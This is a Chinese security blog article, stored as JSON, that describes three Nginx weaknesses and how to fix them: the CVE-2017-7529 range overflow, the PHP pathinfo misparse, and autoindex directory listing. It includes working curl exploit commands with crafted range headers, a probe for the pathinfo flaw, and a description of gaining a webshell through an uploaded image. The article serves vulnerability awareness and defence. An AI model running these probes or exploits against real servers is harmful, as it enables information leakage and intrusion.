{"title":"Nginx脆弱性常见漏洞查看验证","slug":"网安大类/Vulnerable/Web/Nginx脆弱性一览表","date":"2019-07-17T05:36:30.000Z","updated":"2023-01-31T02:29:10.673Z","url":"2019/7-17-419.html","path":"api/articles/2019/7-17-419.html.json","covers":["https://img.weiyigeek.top/2019/1/20190909171059.png"],"content":"<p>[TOC]</p>\n<p><b style=\"color:red\">注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。</b></p>\n<a id=\"more\"></a>\n<h4 id=\"CVE-2017-7529-溢出漏洞\"><a href=\"#CVE-2017-7529-溢出漏洞\" class=\"headerlink\" title=\"CVE-2017-7529 (溢出漏洞)\"></a>CVE-2017-7529 (溢出漏洞)</h4><p>描述: Nginx range 过滤器整形溢出漏洞<br>漏洞信息: 当使用nginx标准模块时，攻击者可以通过发送包含恶意构造 range 域的 header 请求，来获取响应中的缓存文件头部信息。在某些配置中缓存文件头可能包含后端服务器的IP地址或其它敏感信息，从而导致信息泄露。<br>漏洞影响: 当Nginx服务器使用代理缓存的情况下攻击者通过利用该漏洞可以拿到服务器的后端真实IP或其他敏感信息;通过我们的分析判定该漏洞利用难度低可以归属于low-hanging-fruit的漏洞在真实网络攻击中也有一定利用价值。<br>影响版本: Nginx version 0.5.6 - 1.13.2<br>漏洞利用:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#访问缓存文件拿到 Content-Length，以 /proxy/demo.png 为例：</span></span><br><span class=\"line\">$ curl -I http://127.0.0.1:8000/proxy/demo.png</span><br><span class=\"line\">Content-Length: 16585</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#找个比 Content-Length: 16585 这个数大的值</span></span><br><span class=\"line\"><span class=\"comment\">#例如 17208, 第二个 range 值为 0x8000000000000000-17208, 也就是 9223372036854758600</span></span><br><span class=\"line\">$ curl -i http://127.0.0.1:8000/proxy/demo.png -r -17208,-9223372036854758600</span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190909171059.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p><br></p>\n<h4 id=\"Nginx文件类型错误解析漏洞\"><a href=\"#Nginx文件类型错误解析漏洞\" class=\"headerlink\" title=\"Nginx文件类型错误解析漏洞\"></a>Nginx文件类型错误解析漏洞</h4><p>描述:Nginx漏洞分析实例,在2010年的时候国内安全组织80Sec发现了一个Nginx文件类型解析漏洞，但实际上这个并非Nginx本身的漏洞，而是由于配置导致的安全问题。<br>漏洞危害：利用该漏洞，攻击者可以将任意文件类型作为PHP文件解析。<br>漏洞分析：Nginx默认是以CGI的方式支持PHP的解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。<br>配置文件中会有类似如下内容:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#location ~ \\.php$ &#123;</span></span><br><span class=\"line\"><span class=\"comment\">#    root           html;</span></span><br><span class=\"line\"><span class=\"comment\">#    fastcgi_pass   127.0.0.1:9000;</span></span><br><span class=\"line\"><span class=\"comment\">#    fastcgi_index  index.php;</span></span><br><span class=\"line\"><span class=\"comment\">#    fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span></span><br><span class=\"line\"><span class=\"comment\">#    include        fastcgi_params;</span></span><br><span class=\"line\"><span class=\"comment\">#    index  index.php</span></span><br><span class=\"line\"><span class=\"comment\">#&#125;</span></span><br></pre></td></tr></table></figure><br>问题产生: location对请求进行选择的时候会使用URI环境变量进行选择，其中传递到后端Fastcgi的关键变量 <code>SCRIPT_FILENAME</code> , 然后是由Nginx生成的<code>$fastcgi_script_name</code>来决定的;通过分析可以看到$fastcgi_script_name是直接由URI环境变量控制的这里就是产生问题的点;<br>当访问 <a href=\"http://192.168.1.103/phpinfo.jpg/1.php这个URL时\" target=\"_blank\" rel=\"noopener\">http://192.168.1.103/phpinfo.jpg/1.php这个URL时</a> $fastcgi_script_name会被设置为“phpinfo.jpg/1.php “ ,然后构造成SCRIPT_FILENAME传递给PHP CGI;<br>但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢？<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#由于php.ini文件中的cgi参数</span></span><br><span class=\"line\">cgi.fix_pathinfo=1</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#如果开启了这个选项, 那么就会触发在PHP中的如下逻辑:</span></span><br></pre></td></tr></table></figure><br>到这里PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了。</p>\n<p>漏洞利用：假设某一服务器存在该漏洞，攻击者可以通过上传一张包含PHP后门代码的图片来获取WebShell，这是一种常见的攻击方式。<br>POC： 访问一个nginx来支持php的站点，在一个任何资源的文件如robots.txt后面加上/80sec.php，这个时候你可以看到如下的区别：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#访问http://www.80sec.com/robots.txt</span></span><br><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">Server: nginx/0.6.32</span><br><span class=\"line\">Date: Thu, 20 May 2010 10:05:30 GMT</span><br><span class=\"line\">Content-Type: text/plain  <span class=\"comment\">#关键点</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#访问http://www.80sec.com/robots.txt/80sec.php</span></span><br><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">Server: nginx/0.6.32</span><br><span class=\"line\">Date: Thu, 20 May 2010 10:06:49 GMT</span><br><span class=\"line\">Content-Type: text/html   <span class=\"comment\">#关键点</span></span><br><span class=\"line\"><span class=\"comment\">#其中的Content-Type的变化说明了后端负责解析的变化，该站点就可能存在漏洞。</span></span><br></pre></td></tr></table></figure></p>\n<p>解决办法:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#方式1：</span></span><br><span class=\"line\">php.ini文件将 cgi.fix_pathinfo 的值设置为0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#方式2:</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ( <span class=\"variable\">$fastcgi_script_name</span> ~ \\..*\\/.*php ) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">return</span> 403;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n<h4 id=\"Nginx配置错误而导致目录遍历漏洞\"><a href=\"#Nginx配置错误而导致目录遍历漏洞\" class=\"headerlink\" title=\"Nginx配置错误而导致目录遍历漏洞\"></a>Nginx配置错误而导致目录遍历漏洞</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#在Nginx的配置文件中如果开启了autoindex选项，并采用类似下面的配置时会造成目录遍历漏洞。</span></span><br><span class=\"line\">location /<span class=\"built_in\">test</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">alias</span> html/<span class=\"built_in\">test</span>/;</span><br><span class=\"line\">  autoindex on;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","comments":true,"excerpt":"[TOC]注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。","categories":[{"name":"漏洞分析","path":"api/categories/漏洞分析.json"}],"tags":[{"name":"Nginx","path":"api/tags/Nginx.json"}]}